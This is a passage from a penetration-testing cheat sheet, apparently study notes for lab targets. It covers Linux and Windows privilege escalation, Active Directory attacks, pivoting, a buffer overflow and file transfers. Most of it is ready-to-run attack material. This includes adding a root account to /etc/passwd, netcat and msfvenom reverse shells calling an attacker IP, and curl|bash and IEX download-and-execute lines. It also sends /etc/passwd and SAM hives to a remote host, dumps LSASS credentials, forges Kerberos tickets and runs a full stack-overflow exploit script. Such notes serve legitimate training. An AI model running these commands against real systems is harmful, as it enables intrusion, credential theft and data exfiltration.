# Generate password hash  
 
openssl passwd -1 -salt hacker password  
 
# Output: $1$hacker$TzyKlv0/R/c28R.GAeLw.1  
 
# Add root user  
 
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd  
 
# Switch to new user  
 
su hacker  
 
# Password: password  
 
```
 
### Writable /etc/shadow  
 
```bash
 
# Generate password hash  
 
mkpasswd -m sha-512 password  
 
# Replace root's password hash in /etc/shadow  
 
```
 
### PATH Hijacking  
 
```bash
 
# If a SUID binary or cron job calls a command without full path  
 
# Example: binary calls "service restart"  
 
# Create malicious script  
 
echo '/bin/bash -p' > /tmp/service  
 
chmod +x /tmp/service  
 
# Add /tmp to PATH  
 
export PATH=/tmp:$PATH  
 
# Execute the vulnerable binary  
 
/path/to/vulnerable/binary  
 
```
 
### NFS Root Squashing  
 
```bash
 
# Check exports  
 
cat /etc/exports  
 
# Look for no_root_squash  
 
# On attacker machine  
 
showmount -e 10.10.10.x  
 
mkdir /tmp/nfs  
 
mount -o rw,vers=2 10.10.10.x:/share /tmp/nfs  
 
# Create SUID bash  
 
cp /bin/bash /tmp/nfs/  
 
chmod +s /tmp/nfs/bash  
 
# On target  
 
/share/bash -p  
 
```
 
### Kernel Exploits  
 
```bash
 
# Check kernel version  
 
uname -r  
 
# Search for exploits  
 
searchsploit linux kernel <version>  
 
# Common kernel exploits  
 
# DirtyCow (CVE-2016-5195) - Linux < 4.8.3  
 
# DirtyPipe (CVE-2022-0847) - Linux 5.8-5.16.11  
 
```
 
### Automated Enumeration Tools  
 
```bash
 
# LinPEAS  
 
curl -L [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) | sh  
 
./linpeas.sh  
 
# LinEnum  
 
./LinEnum.sh  
 
# Linux Exploit Suggester  
 
./linux-exploit-suggester.sh  
 
# pspy (monitor processes)  
 
./pspy64  
 
```
 
---  
 
## Windows Privilege Escalation  
 
### Initial Enumeration  
 
```cmd
 
:: System info  
 
systeminfo  
 
hostname  
 
whoami /all  
 
net user  
 
net localgroup  
 
net localgroup administrators  
 
:: Network info  
 
ipconfig /all  
 
arp -a  
 
netstat -ano  
 
route print  
 
:: Processes and services  
 
tasklist /SVC  
 
sc queryex type= service  
 
wmic service get name,displayname,pathname,startmode  
 
:: Scheduled tasks  
 
schtasks /query /fo LIST /v  
 
:: Installed software  
 
wmic product get name,version  
 
:: Patches  
 
wmic qfe get Caption,Description,HotFixID,InstalledOn  
 
:: Search for passwords  
 
findstr /si password *.txt *.ini *.config *.xml  
 
dir /s *pass* == *cred* == *vnc* == *.config*  
 
reg query HKLM /f password /t REG_SZ /s  
 
reg query HKCU /f password /t REG_SZ /s  
 
:: Check stored credentials  
 
cmdkey /list  
 
:: Check AlwaysInstallElevated  
 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
 
:: Unquoted service paths  
 
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\"  
 
```
 
### PowerShell Enumeration  
 
```powershell
 
# System info  
 
Get-ComputerInfo  
 
[System.Environment]::OSVersion.Version  
 
# Current user privileges  
 
whoami /priv  
 
# Local users and groups  
 
Get-LocalUser  
 
Get-LocalGroup  
 
Get-LocalGroupMember -Group "Administrators"  
 
# Running services  
 
Get-Service  
 
Get-WmiObject -Class Win32_Service | Select-Object Name, State, PathName  
 
# Scheduled tasks  
 
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}  
 
# Network connections  
 
Get-NetTCPConnection -State Listen  
 
# Installed programs  
 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName  
 
# Search for sensitive files  
 
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"  
 
```
 
### Service Exploitation  
 
#### Unquoted Service Paths  
 
```cmd
 
:: Find unquoted service paths  
 
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """  
 
:: Check permissions on path  
 
icacls "C:\Program Files\Vulnerable Service"  
 
:: If writable, place malicious executable  
 
:: For path: C:\Program Files\Vulnerable Service\Service.exe  
 
:: Place payload at: C:\Program.exe or C:\Program Files\Vulnerable.exe  
 
:: Restart service  
 
sc stop "Service Name"  
 
sc start "Service Name"  
 
```
 
#### Weak Service Permissions  
 
```cmd
 
:: Check service permissions  
 
accesschk.exe /accepteula -uwcqv "Everyone" *  
 
accesschk.exe /accepteula -uwcqv "Authenticated Users" *  
 
accesschk.exe /accepteula -uwcqv "Users" *  
 
:: Check specific service  
 
sc qc "Service Name"  
 
accesschk.exe /accepteula -ucqv "Service Name"  
 
:: If SERVICE_CHANGE_CONFIG permission  
 
sc config "Service Name" binpath= "C:\Users\Public\nc.exe -e cmd.exe 10.10.14.x 4444"  
 
sc stop "Service Name"  
 
sc start "Service Name"  
 
```
 
#### Weak Service Executable Permissions  
 
```cmd
 
:: Check executable permissions  
 
icacls "C:\Path\To\Service.exe"  
 
:: If writable, replace with malicious executable  
 
move "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"  
 
copy C:\Users\Public\shell.exe "C:\Path\To\Service.exe"  
 
:: Restart service  
 
sc stop "Service Name"  
 
sc start "Service Name"  
 
```
 
### AlwaysInstallElevated  
 
```cmd
 
:: Check if enabled  
 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
 
:: Both must be set to 1  
 
:: Create malicious MSI  
 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f msi > shell.msi  
 
:: Install MSI  
 
msiexec /quiet /qn /i shell.msi  
 
```
 
### Stored Credentials  
 
```cmd
 
:: List stored credentials  
 
cmdkey /list  
 
:: Use stored credentials with runas  
 
runas /savecred /user:administrator "cmd.exe /c whoami > C:\Users\Public\output.txt"  
 
runas /savecred /user:administrator "C:\Users\Public\nc.exe -e cmd.exe 10.10.14.x 4444"  

---OR---

Invoke-RunasCs -Username (username) -Password (pass) -Command cmd.exe -Remote (our_ip):(port)
```

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege  
 
#### JuicyPotato (Windows Server 2008-2016)  
 
```cmd
 
:: Download JuicyPotato  
 
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.10.14.x 4444" -t *  
 
```
 
#### PrintSpoofer (Windows 10 / Server 2016-2019)  
 
```cmd
 
:: Download PrintSpoofer  
 
PrintSpoofer.exe -i -c "cmd.exe"  
 
PrintSpoofer.exe -c "c:\users\public\nc.exe 10.10.14.x 4444 -e cmd.exe"  
 
```
 
#### GodPotato (Windows 8-11 / Server 2012-2022)  
 
```cmd
 
GodPotato.exe -cmd "cmd /c whoami"  
 
GodPotato.exe -cmd "cmd /c c:\users\public\nc.exe -e cmd.exe 10.10.14.x 4444"  
 
```
 
### Token Impersonation (Meterpreter)  
 
```bash
 
# In meterpreter  
 
load incognito  
 
list_tokens -u  
 
impersonate_token "NT AUTHORITY\SYSTEM"  
 
```
 
### Registry Autoruns  
 
```cmd
 
:: Check autorun locations  
 
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  
 
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  
 
:: Check permissions on autorun executables  
 
icacls "C:\Path\To\Autorun.exe"  
 
:: If writable, replace with malicious executable  
 
```
 
### DLL Hijacking  
 
```cmd
 
:: Find missing DLLs (use Process Monitor)  
 
:: Or check common locations:  
 
C:\Windows\System32\  
 
Application directory  
 
:: If application loads DLL from writable location  
 
:: Create malicious DLL with same name  
 
```

### DLL Hijack Reference

```text
# .bashrc alias:
# alias dllref='clear ; cat $HOME/ref/dllref'
# This is potentially an incomplete list.

DLL Hijack Targets:
===================
C:\Windows\System32\wpcoreutil.dll    (wisvc - Start Windows Insider Program)
C:\Windows\System32\phoneinfo.dll     (Windows Problem Reporting service)
C:\Windows\System32\wbem\dxgi.dll     (Windows Security -> check for protection update)
C:\Windows\System32\wbem\tzres.dll    (systeminfo, NetworkService)

Require reboot for NT AUTHORITY\SYSTEM:
C:\Windows\System32\wlbsctrl.dll      (IKEEXT service)
C:\Windows\System32\wbem\wbemcomn.dll  (IP Helper)
C:\Windows\System32\ualapi.dll         (Spooler service)
C:\Windows\System32\fveapi.dll         (ShellHWDetection Service)
C:\Windows\System32\Wow64Log.dll       (loaded by third party services e.g. GoogleUpdate.exe)

PrintConfig DLL Hijack:
  msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o Printconfig.dll
  # Overwrite: C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
  # Trigger:
  $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
  $object = [Activator]::CreateInstance($type)

# ALL ABOVE REQUIRE ADMIN READ/WRITE
# SeManageVolumeExploit: https://github.com/CsEnox/SeManageVolumeExploit/
SeManageVolumeExploit.exe
```

### Kernel Exploits
 
```cmd
 
:: Check system info for exploit selection  
 
systeminfo  
 
:: Common Windows exploits  
 
:: MS16-032 (Secondary Logon Handle)  
 
:: MS15-051 (Client Copy Image)  
 
:: MS14-058 (TrackPopupMenu Win32k NULL Pointer)  
 
```
 
### SAM and SYSTEM Files  
 
```cmd
 
:: If accessible (backup locations)  
 
copy C:\Windows\Repair\SAM C:\Users\Public\  
 
copy C:\Windows\Repair\SYSTEM C:\Users\Public\  
 
:: Extract hashes with secretsdump  
 
impacket-secretsdump -sam SAM -system SYSTEM LOCAL  
 
```

### ParsingPeas

```bash
python3 receiver.py

# Linux:
curl -sSL http://YOUR_IP:8000/get-script | bash

# Windows:
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/wrapper-inline.ps1')"
```
### Automated Enumeration Tools  
 
```cmd
 
:: WinPEAS  
 
winpeas.exe  
 
:: PowerUp  
 
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"  
 
:: SharpUp  
 
SharpUp.exe  
 
:: Seatbelt  
 
Seatbelt.exe -group=all  
 
:: Windows Exploit Suggester  
 
systeminfo > systeminfo.txt  
 
python windows-exploit-suggester.py --database 2023-10-01-mssb.xls --systeminfo systeminfo.txt  
 
```
 
---  
 
## Active Directory Attacks  
 
### Enumeration  
 
#### Domain Enumeration  
 
```powershell
 
# Get domain info  
 
Get-Domain  
 
Get-DomainController  
 
# Get users  
 
Get-DomainUser | Select-Object samaccountname, description  
 
Get-DomainUser -SPN # Kerberoastable users  
 
# Get groups  
 
Get-DomainGroup | Select-Object name  
 
Get-DomainGroupMember -Identity "Domain Admins"  
 
# Get computers  
 
Get-DomainComputer | Select-Object name,operatingsystem  
 
# Get GPOs  
 
Get-DomainGPO  
 
# Find shares  
 
Find-DomainShare -CheckShareAccess  

# BLoodhound through cli
bloodhound-python -u 'user' -p 'pass' -d 'domain' -dc 'domain controller' -c All

# BLoodhound over netexec
nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All

# BloodHound collection  
 
SharpHound.exe -c All

# Sharphound powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -JSONFolder "c:\experiments\bloodhound"
 
bloodhound-python -d domain.htb -u user -p password -ns 10.10.10.x -c all  
 
```
 
#### LDAP Enumeration  
 
```bash
 
# Enumerate users  
 
ldapsearch -x -H ldap://10.10.10.x -b "dc=domain,dc=htb" "(objectClass=user)" samaccountname description  
 
# Find service accounts  
 
ldapsearch -x -H ldap://10.10.10.x -b "dc=domain,dc=htb" "(servicePrincipalName=*)" samaccountname servicePrincipalName  
 
```
 
#### SMB Enumeration  
 
```bash
 
# List shares  
 
crackmapexec smb 10.10.10.x -u user -p password --shares  
 
# Spider shares  
 
crackmapexec smb 10.10.10.x -u user -p password -M spider_plus  
 
# Enumerate users via RID cycling  
 
crackmapexec smb 10.10.10.x -u '' -p '' --rid-brute  
 
```
 
### AS-REP Roasting  
 
```bash
 
# Find users without Kerberos pre-authentication  
 
# Using GetNPUsers (impacket)  
 
impacket-GetNPUsers domain.htb/ -usersfile users.txt -dc-ip 10.10.10.x -format hashcat -outputfile asrep.txt  
 
# If you have credentials  
 
impacket-GetNPUsers domain.htb/user:password -dc-ip 10.10.10.x  
 
# Using Rubeus  
 
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt  
 
# Crack hashes  
 
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt  
 
```
 
### Kerberoasting  
 
```bash
 
# Using GetUserSPNs (impacket)  
 
impacket-GetUserSPNs domain.htb/user:password -dc-ip 10.10.10.x -request -outputfile kerberoast.txt  
 
# Using Rubeus  
 
Rubeus.exe kerberoast /outfile:kerberoast.txt  
 
# Crack hashes  
 
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt  

---OR---

# Using mimikatz
mimikatz> kerberos::list /export
kirbi2john.py mssql.kirbi > mssql_hash.txt
cat mssql_hash.txt | cut -d ":" -f 2 > mssql_final.txt
hashcat -m 13100 mssql_final.txt /usr/share/wordlists/rockyou.txt
 
```
 
### Password Spraying  
 
```bash
 
# Using crackmapexec  
 
crackmapexec smb 10.10.10.x -u users.txt -p 'Password123!' --continue-on-success  
 
# Using kerbrute  
 
kerbrute passwordspray -d domain.htb --dc 10.10.10.x users.txt 'Password123!'  

# User enum

kerbrute userenum -d nagoya-industries.com --dc 192.168.123.21 users.txt > validUsers.txt

cat validU | awk '{print $7}'| cut -d "@" -f 1 > domUsers.txt

# combine user and pass

awk 'NR==FNR{u[$0];next} {for(i in u) print i":"$0}' domUsers.txt custom_wordlist.txt > combos.txt

# Using Spray  
 
spray.sh -smb 10.10.10.x users.txt 'Password123!' domain.htb  
 
```
 
### Pass the Hash  
 
```bash
 
# Using crackmapexec  
 
crackmapexec smb 10.10.10.x -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  
 
# Using psexec  
 
impacket-psexec domain.htb/administrator@10.10.10.x -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  
 
# Using wmiexec  
 
impacket-wmiexec domain.htb/administrator@10.10.10.x -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  
 
# Using evil-winrm  
 
evil-winrm -i 10.10.10.x -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0  
 
# Using xfreerdp  
 
xfreerdp /u:administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.10.10.x  
 
```
 
### Pass the Ticket  
 
```bash
 
# Export ticket (on compromised machine)  
 
mimikatz> sekurlsa::tickets /export  
 
# Import ticket on Linux  
 
export KRB5CCNAME=/path/to/ticket.ccache  
 
# Use with impacket  
 
impacket-psexec domain.htb/user@dc01.domain.htb -k -no-pass  
 
```
### Extract Service Tickets  
 
```bash
 
# Need: Domain SID, Service account NTLM hash, Target service  
 
mimikatz> kerberos::list /export
 
```
 

### Silver Ticket  
 
```bash
 
# Need: Domain SID, Service account NTLM hash, Target service  
whoami /user - SID of user
Get-ADDomain | Select-Object -Property DomainSID - DOmain SID

mimikatz> kerberos::golden /domain:domain.htb /sid:S-1-5-21-xxx /rc4:service_ntlm_hash /user:Administrator /service:CIFS /target:dc01.domain.htb /ptt  
 
```
 
### Golden Ticket  
 
```bash
 
# Need: Domain SID, KRBTGT NTLM hash  
 
mimikatz> kerberos::golden /domain:domain.htb /sid:S-1-5-21-xxx /krbtgt:krbtgt_ntlm_hash /user:Administrator /ptt  
 
```
 
### DCSync  
 
```bash
 
# Using mimikatz  
 
mimikatz> lsadump::dcsync /domain:domain.htb /user:Administrator  
 
# Using secretsdump  
 
impacket-secretsdump domain.htb/admin:password@10.10.10.x  
 
impacket-secretsdump domain.htb/admin@10.10.10.x -hashes :ntlm_hash  
 
```
 
### LLMNR/NBT-NS Poisoning  
 
```bash
 
# Using Responder  
 
sudo responder -I eth0 -dwP  

# For my machine

sudo python3 /opt/Responder/Responder.py  

# Crack captured hashes  
 
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt  
 
```
 
### SMB Relay  
 
```bash
 
# Disable SMB and HTTP in Responder  
 
# Edit /etc/responder/Responder.conf  
 
SMB = Off  
 
HTTP = Off  
 
# Start Responder  
 
sudo responder -I eth0 -dwP  
 
# Start ntlmrelayx  
 
impacket-ntlmrelayx -tf targets.txt -smb2support -i  
 
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"  
 
# For SAM dump  
 
impacket-ntlmrelayx -tf targets.txt -smb2support  
 
```
 
### Credential Dumping  
 
#### LSASS  
 
```bash
 
# Using mimikatz  
 
mimikatz> privilege::debug  
 
mimikatz> sekurlsa::logonpasswords  
 
# Using procdump  
 
procdump.exe -accepteula -ma lsass.exe lsass.dmp  
 
# Parse dump with mimikatz  
 
mimikatz> sekurlsa::minidump lsass.dmp  
 
mimikatz> sekurlsa::logonpasswords  
 
```
 
#### SAM Database  
 
```bash
 
# Using mimikatz  
 
mimikatz> lsadump::sam  
 
# Using reg save  
 
reg save HKLM\SAM sam.save  
 
reg save HKLM\SYSTEM system.save  
 
# Parse with secretsdump  
 
impacket-secretsdump -sam sam.save -system system.save LOCAL  
 
```
 
---  
 
## Pivoting and Tunneling  
 
### SSH Tunneling  
 
#### Local Port Forwarding  
 
```bash
 
# Forward local port to remote service  
 
ssh -L 8080:[127.0.0.1:80](http://127.0.0.1:80) user@10.10.10.x  
 
# Access: localhost:8080 -> target:80  
 
# Forward to another host  
 
ssh -L 8080:[192.168.1.100:80](http://192.168.1.100:80) user@10.10.10.x  
 
# Access: localhost:8080 -> [192.168.1.100:80](http://192.168.1.100:80) (through SSH host)  
 
```
 
#### Remote Port Forwarding  
 
```bash
 
# Expose attacker port on remote host  
 
ssh -R 8080:[127.0.0.1:80](http://127.0.0.1:80) user@10.10.10.x  
 
# Access from target: localhost:8080 -> attacker:80  
 
```
 
#### Dynamic Port Forwarding (SOCKS Proxy)  
 
```bash
 
# Create SOCKS proxy  
 
ssh -D 9050 user@10.10.10.x  
 
# Use with proxychains  
 
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 9050  
 
proxychains nmap -sT -Pn [192.168.1.0/24](http://192.168.1.0/24)  
 
proxychains curl [http://192.168.1.100](http://192.168.1.100)  
 
```
 
### Chisel  
 
#### Reverse SOCKS Proxy  
 
```bash
 
# On attacker (server)  
 
chisel server -p 8080 --reverse  
 
# On target (client)  
 
chisel client 10.10.14.x:8080 R:socks  
 
# Configure proxychains  
 
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080  
 
proxychains nmap -sT -Pn 192.168.1.100  
 
```
 
#### Port Forwarding  
 
```bash
 
# On attacker (server)  
 
chisel server -p 8080 --reverse  
 
# On target (client) - forward specific port  
 
chisel client 10.10.14.x:8080 R:3389:[192.168.1.100:3389](http://192.168.1.100:3389)  
 
# Access: localhost:3389 -> [192.168.1.100:3389](http://192.168.1.100:3389)  
 
```
 
### Ligolo-ng (Recommended)  
 
```bash
 
# On attacker - start proxy  
 
./proxy -selfcert -laddr [0.0.0.0:11601](http://0.0.0.0:11601)  
 
# On target - start agent  
 
./agent -connect 10.10.14.x:11601 -ignore-cert  
 
# In ligolo interface  
 
ligolo-ng >> session  
 
ligolo-ng >> 1 # Select session  
 
ligolo-ng >> ifconfig # View target interfaces  
 
# Add route on attacker  
 
sudo ip route add [192.168.1.0/24](http://192.168.1.0/24) dev ligolo  
 
# Start tunnel  
 
ligolo-ng >> start  
 
```
 
### Socat  
 
#### Port Forwarding  
 
```bash
 
# Forward connections  
 
socat TCP-LISTEN:8080,fork TCP:[192.168.1.100:80](http://192.168.1.100:80)  
 
```
 
#### Reverse Shell Relay  
 
```bash
 
# On attacker  
 
nc -nlvp 4444  
 
# On pivot host  
 
socat TCP-LISTEN:5555,fork TCP:10.10.14.x:4444  
 
# On target  
 
nc -e /bin/bash pivot_host 5555  
 
```
 
### Metasploit Pivoting  
 
```bash
 
# After getting meterpreter session  
 
meterpreter> run autoroute -s [192.168.1.0/24](http://192.168.1.0/24)  
 
# Use SOCKS proxy  
 
use auxiliary/server/socks_proxy  
 
set SRVPORT 9050  
 
run  
 
# Configure proxychains and use tools through proxy  
 
```
 
### plink (Windows)  
 
```cmd
 
:: Forward remote port locally  
 
plink.exe -L 8080:[127.0.0.1:80](http://127.0.0.1:80) user@10.10.10.x  
 
:: Dynamic port forwarding  
 
plink.exe -D 9050 user@10.10.10.x  
 
```
 
### netsh (Windows)  
 
```cmd
 
:: Port forwarding  
 
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100  
 
:: List port forwards  
 
netsh interface portproxy show all  
 
:: Remove port forward  
 
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0  
 
```
 
---  
 
## Buffer Overflow  
 
### Methodology  
 
1. **Fuzzing** - Find crash point  
 
2. **Pattern Creation** - Find exact offset  
 
3. **EIP Control** - Verify offset  
 
4. **Bad Character** - Find characters to avoid  
 
5. **Find JMP ESP** - Return address  
 
6. **Generate Shellcode** - Create payload  
 
7. **Exploit** - Execute  
 
### Step 1: Fuzzing Script  
 
```python
 
#!/usr/bin/python3  
 
import socket  
 
import sys  
 
ip = "10.10.10.x"  
 
port = 9999  
 
buffer = b"A" * 100  
 
while True:  
 
try:  
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 
s.settimeout(5)  
 
s.connect((ip, port))  
 
s.recv(1024)  
 
print(f"[*] Sending {len(buffer)} bytes")  
 
s.send(b"OVERFLOW1 " + buffer + b"\r\n")  
 
s.recv(1024)  
 
s.close()  
 
buffer += b"A" * 100  
 
except:  
 
print(f"[!] Crashed at {len(buffer)} bytes")  
 
sys.exit()  
 
```
 
### Step 2: Find Offset  
 
```bash
 
# Generate pattern  
 
msf-pattern_create -l 3000  
 
# After crash, find offset  
 
msf-pattern_offset -l 3000 -q <EIP_VALUE>  
 
```
 
```python
 
#!/usr/bin/python3  
 
import socket  
 
ip = "10.10.10.x"  
 
port = 9999  
 
offset = 1978  
 
buffer = b"A" * offset + b"B" * 4 + b"C" * (3000 - offset - 4)  
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 
s.connect((ip, port))  
 
s.send(b"OVERFLOW1 " + buffer + b"\r\n")  
 
s.close()  
 
```
 
### Step 3: Find Bad Characters  
 
```python
 
#!/usr/bin/python3  
 
import socket  
 
ip = "10.10.10.x"  
 
port = 9999  
 
badchars = (  
 
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"  
 
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"  
 
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"  
 
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"  
 
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"  
 
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"  
 
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"  
 
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"  
 
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"  
 
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"  
 
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"  
 
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"  
 
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"  
 
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"  
 
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"  
 
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
 
)  
 
offset = 1978  
 
buffer = b"A" * offset + b"B" * 4 + badchars  
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 
s.connect((ip, port))  
 
s.send(b"OVERFLOW1 " + buffer + b"\r\n")  
 
s.close()  
 
```
 
### Step 4: Find JMP ESP  
 
```bash
 
# In Immunity Debugger with mona.py  
 
!mona jmp -r esp -cpb "\x00"  
 
# Note: Address must not contain bad characters  
 
```
 
### Step 5: Generate Shellcode  
 
```bash
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -b "\x00" -f python EXITFUNC=thread  
 
```
 
### Step 6: Final Exploit  
 
```python
 
#!/usr/bin/python3  
 
import socket  
 
ip = "10.10.10.x"  
 
port = 9999  
 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -b "\x00" -f python EXITFUNC=thread  
 
buf = b""  
 
buf += b"\xdb\xc8\xd9\x74\x24\xf4\xbf\x7a\xe7\x84\x6e\x5a\x29"  
 
# ... rest of shellcode  
 
offset = 1978  
 
jmp_esp = b"\xaf\x11\x50\x62" # Address in little endian  
 
nop_sled = b"\x90" * 16  
 
buffer = b"A" * offset + jmp_esp + nop_sled + buf  
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 
s.connect((ip, port))  
 
s.send(b"OVERFLOW1 " + buffer + b"\r\n")  
 
s.close()  
 
```
 
### Mona.py Commands  
 
```bash
 
# Set working folder  
 
!mona config -set workingfolder C:\mona\%p  
 
# Generate byte array (exclude null)  
 
!mona bytearray -b "\x00"  
 
# Compare memory with byte array  
 
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP_ADDRESS>  
 
# Find JMP ESP  
 
!mona jmp -r esp -cpb "\x00"  
 
!mona find -s "\xff\xe4" -m essfunc.dll  
 
# Find modules without protections  
 
!mona modules  
 
```
 
---  
 
## File Transfers  
 
### Linux  
 
#### Download Files  
 
```bash
 
# wget  
 
wget [http://10.10.14.x/file.sh](http://10.10.14.x/file.sh)  
 
# curl  
 
curl [http://10.10.14.x/file.sh](http://10.10.14.x/file.sh) -o file.sh  
 
curl [http://10.10.14.x/file.sh](http://10.10.14.x/file.sh) | bash  
 
# netcat  
 
nc -nlvp 4444 > file.sh # Receiver  
 
nc 10.10.14.x 4444 < file.sh # Sender  
 
# Python  
 
python3 -c "import urllib.request; urllib.request.urlretrieve('[http://10.10.14.x/file.sh](http://10.10.14.x/file.sh)', 'file.sh')"  
 
# PHP  
 
php -r "file_put_contents('file.sh', file_get_contents('[http://10.10.14.x/file.sh'))](http://10.10.14.x/file.sh'\)\));"  
 
```
 
#### Upload Files  
 
```bash
 
# curl POST  
 
curl -X POST [http://10.10.14.x/upload](http://10.10.14.x/upload) -F "file=@/etc/passwd"  
 
# netcat  
 
nc 10.10.14.x 4444 < /etc/passwd  
 
# Base64 encoding  
 
base64 /etc/passwd | nc 10.10.14.x 4444  
 
# Decode: nc -nlvp 4444 | base64 -d > passwd  
 
```
 
### Windows  
 
#### Download Files  
 
```cmd
 
:: certutil  
 
certutil -urlcache -split -f [http://10.10.14.x/file.exe](http://10.10.14.x/file.exe) file.exe  
 
:: PowerShell  
 
powershell -c "Invoke-WebRequest -Uri [http://10.10.14.x/file.exe](http://10.10.14.x/file.exe) -OutFile file.exe"  
 
powershell -c "(New-Object Net.WebClient).DownloadFile('[http://10.10.14.x/file.exe](http://10.10.14.x/file.exe)','file.exe')"  
 
powershell -c "IEX(New-Object Net.WebClient).DownloadString('[http://10.10.14.x/script.ps1'](http://10.10.14.x/script.ps1'))"  
 
:: bitsadmin  
 
bitsadmin /transfer job /download /priority normal [http://10.10.14.x/file.exe](http://10.10.14.x/file.exe) C:\Users\Public\file.exe  
 
:: SMB  
 
copy \\10.10.14.x\share\file.exe C:\Users\Public\file.exe  
 
```
 
#### Upload Files  

```bash
#First start the python upload server:

python3 upload_server.py
```
 
```cmd
 
:: PowerShell  
 
powershell -c "(New-Object Net.WebClient).UploadFile('http://10.10.14.x/upload', 'C:\file.txt')"  

--OR--

Invoke-WebRequest -Uri http://<your-ip>:8888/SAM -Method Post -InFile SAM

--OR--

curl --data-binary @SAM http://<your-ip>:8888/SAM
 
:: SMB  
 
copy C:\file.txt \\10.10.14.x\share\  
 
```
 
### Setting Up Servers  
 
```bash
 
# Python HTTP server  
 
python3 -m http.server 80  
 
python -m SimpleHTTPServer 80  
 
# PHP server  
 
php -S [0.0.0.0:80](http://0.0.0.0:80)  
 
# SMB server  
 
impacket-smbserver share . -smb2support  
 
impacket-smbserver share . -smb2support -username user -password pass  
 
# FTP server  
 
python3 -m pyftpdlib -p 21 -w  
 
# Upload server (uploadserver module)  
 
pip install uploadserver  
